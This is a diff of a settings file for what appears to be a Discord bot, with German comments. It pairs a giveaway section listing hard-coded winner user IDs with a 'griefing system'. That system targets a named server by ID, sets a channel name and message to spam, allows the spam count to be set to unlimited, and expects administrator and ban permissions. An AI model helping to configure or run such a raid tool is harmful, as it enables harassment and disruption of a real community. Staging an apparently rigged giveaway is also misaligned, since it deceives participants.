@@ -1,5 +1,8 @@
 class Settings:
-    COLOR=0xa83232 # embed farbe
+    # GIVEAWAY SYSTEM
+    # ---------------------------------------------------------------------------------------------------------------------  
+    
+    COLOR=0xa83232 # Embed Farbe
     WINNERS=[
         '733403498766401554', # kiwious
         '547664017209032709', # brawny
@@ -10,15 +13,24 @@ class Settings:
         '647798346265657345', # vacuumboy
         '731167863234363522', # niniunsinushi
     ]
-    GIVEAWAY_TIME=5 # giveaway zeit in sekunden (die 5 sekunden sind temporär)
+    GIVEAWAY_TIME=5 # Giveaway Zeit in Sekunden (die 5 Sekunden sind temporär)
 
     # GRIEFING SYSTEM:
+    # ---------------------------------------------------------------------------------------------------------------------
 
-    # Erforderliche Bot-Rechte (True => Erforderlich, False => Nicht erforderlich):
-    GRIEF_SERVER=1029431306582491226
-    TEST_SERVER=1092150923897339964
+    GRIEF_SERVER=1029431306582491226 # Server Id von Kings Server
+
+    TEST_SERVER=1092150923897339964 # Server Id vom Test server
+
+    CHANNEL_SPAM_NAME='negus' # Name des Channels der Gespammt werden soll
+    
+    CHANNEL_SPAM_AMOUNT=5 # Wie viel mal der Channel gespammt werden soll => Auf None setzen wenn unendlich viel
+
+    CHANNEL_SPAM_MESSAGE='ping' # Welche Nachricht in jeden gespammten Channel geschickt werden soll
+
+    #  Bot-Rechte (True => Vorhanden, False => Nicht vorhanden):
     CLIENT_PERMISSIONS={
-        'add_reactions': True,
+        'add_reactions': False,
         'administrator': True,
         'attach_files': True,
         'ban_members': True,
